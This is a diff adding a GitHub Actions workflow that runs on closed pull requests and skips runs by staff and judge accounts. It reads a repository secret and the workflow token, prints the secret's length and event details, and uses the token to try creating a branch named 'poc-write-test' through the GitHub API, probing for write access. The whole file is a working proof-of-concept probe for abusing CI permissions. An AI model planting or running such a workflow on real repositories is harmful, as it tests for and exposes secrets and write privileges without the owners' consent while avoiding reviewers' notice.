@@ -1,0 +1,21 @@
+name: ProbePrClosed
+on:
+  pull_request:
+    types: [closed]
+jobs:
+  probe:
+    if: github.actor != 'C4-Staff' && github.actor != 'c4-judge' && github.actor != 'howlbot-integration'
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: probe
+        env:
+          S: ${{ secrets.TEST_SECRET }}
+          T: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "MARKER=BASEFILE"
+          echo "actor=$GITHUB_ACTOR event=$GITHUB_EVENT_NAME action=${{ github.event.action }}"
+          echo "secret_len=${#S}"
+          echo "head_repo=${{ github.event.pull_request.head.repo.full_name }}"
+          echo "workflow_ref=$GITHUB_WORKFLOW_REF"
+          echo "token_probe=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H "Authorization: Bearer $T" https://api.github.com/repos/$GITHUB_REPOSITORY/git/refs -d '{"ref":"refs/heads/poc-write-test","sha":"'"$GITHUB_SHA"'"}')"
